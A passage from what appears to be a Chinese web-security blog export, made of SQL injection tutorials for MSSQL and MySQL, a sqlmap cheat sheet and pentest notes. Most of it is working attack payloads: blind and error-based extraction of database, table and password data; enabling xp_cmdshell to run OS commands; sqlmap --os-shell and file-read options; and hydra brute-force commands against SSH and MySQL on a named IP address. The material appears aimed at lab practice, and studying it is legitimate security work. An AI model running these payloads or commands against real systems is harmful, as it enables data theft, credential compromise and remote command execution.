and name not in (select top 1 name from test..syscolumns where id=2105058535))%2Bchar(126)--\n\n\nsql语句select * from user where id=1 and 1=(select top 1 cast(name as nvarchar(1000)) from test..syscolumns where id=2105058535 and name not in (select top 1 name from test..syscolumns where id=2105058535))%2Bchar(126)--;\n\n查看username字段的所有数据payload1 and 1=(select top 1 cast(username as nvarchar(1000)) from users where username  not in (select top 0 username from users ))%2Bchar(126)--\n\nsql语句select * from user where id=1 and 1=(select top 1 cast(username as nvarchar(1000)) from users where username  not in (select top 0 username from users ))%2Bchar(126)--;\n\n\n查看password字段的所有数据payload1 and 1=(select top 1 cast(password as nvarchar(1000)) from users where password  not in (select top 0 password from users ))%2Bchar(126)--\n\n\nsql语句select * from user where id=1 and 1=(select top 1 cast(password as nvarchar(1000)) from users where password  not in (select top 0 password from users ))%2Bchar(126)--;\n\n三：bool(布尔盲注)判断注入类型payload&#x27;&quot;\\\t\t\t\t\t\t\t\t\t\t//判断注入类型1 and 1=1 --\t\t\t\t\t\t\t\t//页面正常1 and 1=0 --\t\t\t\t\t\t\t\t//返回不常 ，存在注入   \n\n判断所有数据库的长度payloadand (select top 1 len(name) from master..sysdatabases where name not in (select top 1 len(name) from master..sysdatabases))&gt;7--\n\nsql语句select * from user where id=1 and (select top 1 len(name) from master..sysdatabases where name not in (select top 1 len(name) from master..sysdatabases))&gt;7--;\n\n第三个库名的长度payloadand (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;5--\n\n\nand (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;4--\n\n\nand (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=5--\n\n\nsql语句select * from user where id=1 and (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=5--;\n\n第三个数据库，名长度为5，\n判断数据库名的字母payloadand (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;109--\n\n\nand (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;108--\n\n\nand (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=109--\n\n\n第一个字母的ascii值为109and (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;111--\n\n\nand (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;110--\n\n\nand (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=111--\n\n\n第二个字母的ascii值为111and (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;100--\n\n\nand (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;99--\n\n\nand (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=100--\n\n\n第三个字母的ascii值为100and (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;101--\n\n\nand (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;100--\n\n\nand (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=101--\n\n\n第四个字母的ascii值为101and (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;108--\n\n\nand (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;107--\n\n\nand (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=108--\n\n\n第五个字母的ascii值为108第三个数据库名称为model\n查询第五个表名的长度payloadand (select top 1 len(name) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=13--\t\t\t//表名长度为13位\n\nsql语句select * from user where id=1 and (select top 1 len(name) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=13--;\n\n查询表名的字母payloadand (select top 1 ascii(substring(name,1,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;115--\t\t// 页面返回异常and (select top 1 ascii(substring(name,1,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;114--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,1,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=115--\t\t// 页面返正常  // 第一位ascii值为115 转换字母为s    \n\nand (select top 1 ascii(substring(name,2,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;121--\t\t// 页面返回异常and (select top 1 ascii(substring(name,2,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;120--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,2,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=121--\t\t// 页面返正常  // 第二位ascii值为121 转换字母为y      \n\nand (select top 1 ascii(substring(name,3,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;115--\t\t// 页面返回异常and (select top 1 ascii(substring(name,3,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;114--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,3,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=115--\t\t// 页面返正常  // 第三位ascii值为115 转换字母为s    \n\nand (select top 1 ascii(substring(name,4,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;112--\t\t// 页面返回异常and (select top 1 ascii(substring(name,4,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;111--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,4,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=112--\t\t// 页面返正常  // 第四位ascii值为112 转换字母为p  \n\nand (select top 1 ascii(substring(name,5,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;114--\t\t// 页面返回异常and (select top 1 ascii(substring(name,5,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;113--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,5,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=114--\t\t// 页面返正常  // 第五位ascii值为114 转换字母为r  \n\nand (select top 1 ascii(substring(name,6,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;105--\t\t// 页面返回异常and (select top 1 ascii(substring(name,6,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;104--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,6,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=105--\t\t// 页面返正常  // 第六位ascii值为105 转换字母为i  \n\nand (select top 1 ascii(substring(name,7,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;111--\t\t// 页面返回异常and (select top 1 ascii(substring(name,7,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;110--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,7,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=111--\t\t// 页面返正常  // 第七位ascii值为111 转换字母为o \n\nand (select top 1 ascii(substring(name,8,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;114--\t\t// 页面返回异常and (select top 1 ascii(substring(name,8,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;113--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,8,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=114--\t\t// 页面返正常  // 第八位ascii值为114 转换字母为r  \n\nand (select top 1 ascii(substring(name,9,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;105--\t\t// 页面返回异常and (select top 1 ascii(substring(name,9,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;104--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,9,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=105--\t\t// 页面返正常  // 第九位ascii值为105 转换字母为i  \n\nand (select top 1 ascii(substring(name,10,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;116--\t\t// 页面返回异常and (select top 1 ascii(substring(name,10,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;115--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,10,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=116--\t\t// 页面返正常  // 第十位ascii值为116 转换字母为t\n\nand (select top 1 ascii(substring(name,11,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;105--\t\t// 页面返回异常and (select top 1 ascii(substring(name,11,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;104--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,11,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=105--\t\t// 页面返正常  // 第十一位ascii值为105 转换字母为i  \n\nand (select top 1 ascii(substring(name,12,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;101--\t\t// 页面返回异常and (select top 1 ascii(substring(name,12,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;100--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,12,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=101--\t\t// 页面返正常  // 第十二位ascii值为101 转换字母为e  \n\nand (select top 1 ascii(substring(name,13,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;115--\t\t// 页面返回异常and (select top 1 ascii(substring(name,13,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))&gt;114--\t\t// 页面返回正常     and (select top 1 ascii(substring(name,13,1)) from model..sysobjects where name not in (select top 4 name from master..sysobjects))=115--\t\t// 页面返正常  // 第十三位ascii值为115 转换字母为s  \n\n数据库为model表的名syspriorities \n四：时间盲注判断注入payload&#x27;&quot;\\\t\t\t\t\t\t\t\t\t\t//判断注入类型1 WAITFOR DELAY &#x27;0:0:3&#x27;\t\t\t\t\t//加载无延时1&#x27; WAITFOR DELAY &#x27;0:0:3&#x27;\t\t\t\t//加载有延时\n\nsql语句select * from user where id=1 WAITFOR DELAY &#x27;0:0:3&#x27;;\n\n判断数据库的长度payload if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;5 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;4 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=5 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时//数据库名长度为5      \n\nsql语句select * from user where id=1 if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;5 waitfor delay &#x27;0:0:3&#x27;--;\n\n判断数据库名的字母payload if (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;109 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;108waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=109 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为109 转换字母为m       if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;111 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;110waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=111 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为111 转换字母为o       if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;100 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;99waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=100 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为100 转换字母为d   if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;101 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;100waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=101 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为101 转换字母为e   if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;108 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;107waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=108 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为108 转换字母为l      \n\n第三个数据库名称为model\n判断数据库的长度payload if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;13 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;12 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=13 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时//数据库名长度为13      \n\nsql语句select * from user where id=1 if (select top 1 len(name) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;13 waitfor delay &#x27;0:0:3&#x27;--;\n\n查询表名的字母payloadif (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;115 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;114waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,1,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=115 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为115 转换字母为s       if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;121 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;120 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,2,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=121 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为121 转换字母为y      if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;115 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;114waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,3,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=115 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为115 转换字母为s   if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;112 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;111 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,4,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=112 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为112 转换字母为p   if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;114 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;113 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,5,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=114 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为114 转换字母为r  if (select top 1 ascii(substring(name,6,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;105 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,6,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;104 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,6,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=105 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为105 转换字母为i              if (select top 1 ascii(substring(name,7,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;111 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,7,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;110 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,7,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=111 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为111 转换字母为o              if (select top 1 ascii(substring(name,8,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;114 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,8,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;113 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,8,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=114 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为114 转换字母为r             if (select top 1 ascii(substring(name,9,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;105 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,9,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;104 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,9,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=105 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为105 转换字母为i            if (select top 1 ascii(substring(name,10,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;116 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,10,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;115 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,10,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=116 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为116 转换字母为t             if (select top 1 ascii(substring(name,11,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;105 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,11,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;104 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,11,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=105 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为105 转换字母为i            if (select top 1 ascii(substring(name,12,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;101 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,12,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;100 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,12,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=101 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为101 转换字母为e              if (select top 1 ascii(substring(name,13,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;115 waitfor delay &#x27;0:0:3&#x27;--\t//加载有延时 if (select top 1 ascii(substring(name,13,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))&gt;114waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时   if (select top 1 ascii(substring(name,13,1)) from master..sysdatabases where name not in (select top 2 name from master..sysdatabases))=115 waitfor delay &#x27;0:0:3&#x27;--\t//加载无延时// 第一位ascii值为115 转换字母为s      \n\n数据库为model表的名syspriorities \n五：xp_cmdshellxp_cmdshell默认状态是关闭的/管理员才能开启\n开启xp_cmdshell功能?id=1&#x27;; EXEC sp_configure &#x27;show advanced options&#x27;, 1;   --?id=1&#x27;; RECONFIGURE;    --?id=1&#x27;; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;   --?id=1&#x27;; RECONFIGURE;   --\n\n添加表名和列名?id=1&#x27;; create table sqldata(yihua varchar(8000));--   //在当前数据库添加一个&quot;sqldata&quot;的表名和&quot;yihua&quot;的列名\n\n向数据库写入文件?id=1&#x27;; insert into sqldata (yihua) exec master..xp_cmdshell &#x27;echo xxx&#x27;;--   //向列写入&quot;xxx&quot;\n\n读取写入的数据?id=1&#x27; and 1=(select top 1 cast(yihua as varchar(8000)) from sqldata where yihua not in(select top 0 isnull(yihua,&#x27;&#x27;) from sqldata))%2bchar(126)--    //查询结果为xxx\n\nxp_cmdshell开启成功\n清除表?id=1&#x27;; delete from sqldata;--   //清除表\n\n向数据库写入命令?id=1&#x27;;inster into sqldata (yihua) exec master..xp_cmdshell &#x27;net user&#x27;--\t\t\t\t//查看有哪些用户，windows命令\n\n查看执行结果?id=1&#x27; and 1=(select top 1 cast(yihua as varchar(8000)) from sqldata where yihua not in(select top 0 isnull(yihua,&#x27;&#x27;) from sqldata))%2bchar(126)-- \n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"sqlmap的使用","url":"http://example.com/2022/02/11/sqlmap的使用/","content":"一：基础用法-u \t\t\t\t\t\t\t\t// 指定的url--dbs\t\t\t\t\t\t\t//所有数据库  --current-db\t\t\t\t\t//查看网站当前数据库-D\t\t\t\t\t\t\t\t//指定数据库-tables\t\t\t\t\t\t\t//列出表名-T\t\t\t\t\t\t\t\t//指定表 -C\t\t\t\t\t\t\t\t//指定字段   --dump\t\t\t\t\t\t\t//列出字段内容，转存数据 –current-user\t\t\t\t\t//获取当前用户名称 -p    \t\t\t\t\t\t\t//指定参数\n\n二：常用语法-v\t\t\t\t\t\t\t\t//输出信息按从简到繁，从0-6共分为7个级别-privileges\t\t\t\t\t\t//测试所有用户的权限--os-cmd=&quot;net user&quot;    \t\t\t//执行net user命令--os-shell\t\t\t\t\t\t//系统交互的shell -data\t\t\t\t\t\t\t//通过post方式提交-is-dba\t\t\t\t\t\t\t//是否是数据库管理员--risk    \t\t\t\t\t\t//3个等级使用更多的payload--level\t\t\t\t\t\t\t//5个探测等级    \n\n\n--roles\t\t\t\t\t\t\t//列出数据库管理员角色--banner\t\t\t\t\t\t//返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息--threads 5     \t\t\t\t//5线程--delay 0.5 \t\t\t\t\t//延时0.5秒注入    -method    \t\t\t\t\t\t//指定提交方法\n\n\n--cookie\t\t\t\t\t\t//cookie注入\n\n\n--user-agent\t\t\t\t\t\t//指定user-agent的值--random-agent\t\t\t\t\t\t//随机获取user-agent的值    \n\n\n-referer=&quot;aaa&quot;\t\t\t\t//referer注入\n\n\n--sql-shell\t\t\t\t\t\t\t//获取交互式SQL语句shell\n\n\n--sql-query\t\t\t\t\t\t\t//执行sql语句注入\n\n\n--sql-file\t\t\t\t\t\t\t//执行文件中的sql语句\n\n\n三：Sqlmap文件操作--file-read +文件的绝对路径\t\t\t//读取文件\n\n\n--file-write &quot;写入本地文件的地址&quot;--file-dest &quot;要写入的文件绝对路径&quot;    \t//文件上传\n\n\n--technique B\t\t\t\t\t//布尔盲注--technique E\t\t\t\t\t//报错注入--technique U\t\t\t\t\t//联合注入--technique S\t\t\t\t\t//堆叠查询--technique\tT --time-sec\t\t//时间盲注--technique Q                   //内联查询--chunked         \t\t\t\t//分块传输发送payload测试sql注入绕waf  --force-ssl    \t\t\t\t\t//强制走https    \n\nsqlmap -u url --prefix=&quot;)]&quot;\t\t\t//添加前缀闭合sqlmap -u url --suffix=%23    \t\t//添加后缀注释\n\nsqlmap -u url --identify-waf  \t\t//waf识别sqlmap -u url --tamper=脚本位置   \t//绕waf，kali下的脚本目录usr/share/sqlmap/tamper--no-escape    \t\t\t\t\t\t//关闭字符串转义机制-f \t\t\t\t\t\t\t\t\t//指纹判别数据库类型sqlmap -g &quot;google 语法&quot;\t\t\t\t//使用谷歌语法    \n\n","categories":["web安全"],"tags":["SQL注入"]},{"title":"渗透测试流程","url":"http://example.com/2022/02/09/渗透测试流程/","content":"一：爆破目标主机服务器目标主机 106.55.187.63\n一：信息收集1.使用nmap扫描目标主机命令\nnmap -T4 -A -v 106.55.187.63\n\n1.主机系统llinux操作系统\n\n2.开放端口\n2.fscan扫描命令\nfscan.exe -h 106.55.187.63\n\n发现web网站\n\nhttp://106.55.187.63:8002      //登录http://106.55.187.63:8001      //pikachu靶场\n\n二:漏洞利用一:端口爆破ssh服务端口：2222\n攻击方式：爆破(hydra) ，弱口令\nhydra  -L user.txt -P password.txt -vV -t 5 ssh://106.55.187.63:2222 \n\n\nMySql数据库端口：3306\n攻击方式：爆破(hydra) ，弱口令\nhydra  -L user.txt -P password.txt -vV -t 5 mysql://106.55.187.63:3306\n\nDNS服务端口：53\n攻击方式：区域传输漏洞\nApache端口：8001\n攻击方式：爆破，弱口令\n三：sql注入练习1.字符型注入单引号判断注入点和类型\n\n报错回显 ‘’’ \n单引号闭合的字符型注入 \n2.判断字段数 \n判断字段数为 2\n\n3.3.使用 mysql 命令 select database()命令返回当前的数据库\n\n4.利用 information_schema 查询 security 数据库的所有表\n\n5.查询 security 数据库中 users 中的所有字段\n\n6.查询登录名称及密码\n\n2.数字型注入1.burp 抓包测试字段数位 2\n\n2.使用 mysql 命令 select database()命令返回当前的数据库\n\n3.抓包查询利用 information_schema 查询 security 数据库的所有表\n\n4.查询 security 数据库中 users 中的所有字段\n\n5.查询登录名称及密码\n\n3.xxx型注入单引号判断是否有注入点和注入类型。直接出现报错。报错内容为 ‘1’’)\n该类型为字符型注入\n暂时可判定运行代码\nselect * from xxxx where name=（&#x27;$name&#x27;)\n\n\n\n\n\n尝试进行构造万能语句\n1&#x27;)  or  &#x27;1&#x27;=&#x27;1&#x27; or (&#x27;\n\n\n\n通过闭合爆出字段数,从一开始依次递增 ，到3时出现数字不存在，说明 字段数为2\n&#x27;) order by 3#\n\n\n\n使用union联合查询查出数据库为pikachu\n&#x27;) union select 1,database()#\n\n\n查询数据库中的表依次查询\n&#x27;) union select table_name,2 from information_schema.tables  where table_schema=database() limit 0,1#\n\n\n查看pikachu数据库中users表中的字段\n&#x27;) union select column_name,2 from information_schema.columns  where table_schema=database() and table_name=&#x27;users&#x27;limit 2,1#\n\n\n产看用户名和密码\n&#x27;) union select username,password from pikachu.users#\n\n\n4.”insert/pdate”注入1.insert登录页面注入单引号报错说明存在漏洞\n\n通过报错注入爆出数据库\n&#x27; or extractvalue(1,concat(0x7e,(select database()))) or&#x27;   \n\n\n\n爆出表名\n&#x27; or extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 2,1))) or&#x27; \n\n\n再次构建爆出列名\n&#x27; or extractvalue(1,concat(0x7e,(select concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 2,1))) or&#x27;\n\n\n产看账户密码\n&#x27;or extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 0,1),0x7e),1,32))or&#x27;\n\n\n2.update注入性别加入单引号发生错，从报错可以判断存在注入点，并且为整型\n\n构建payload 爆出数据库为pikachu\n&#x27;nd extractvalue(1,concat(0x7e,(database()),0x7e))%23\n\n\n获取数据库中的表\n&#x27; and extractvalue(1,concat(0x7e,(select table_name frominformation_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1),0x7e))%23\n\n\n获取users表中的字段\n&#x27; and extractvalue(1,concat(0x7e,(select column_name frominformation_schema.columns where table_schema=&#x27;pikachu&#x27;and table_name&#x27;users&#x27; limit 0,1),0x7e))%23\n\n\n获取密码\n&#x27;and extractvalue(1,substr(concat(0x7e,(select group_concat(username,password) from users limit 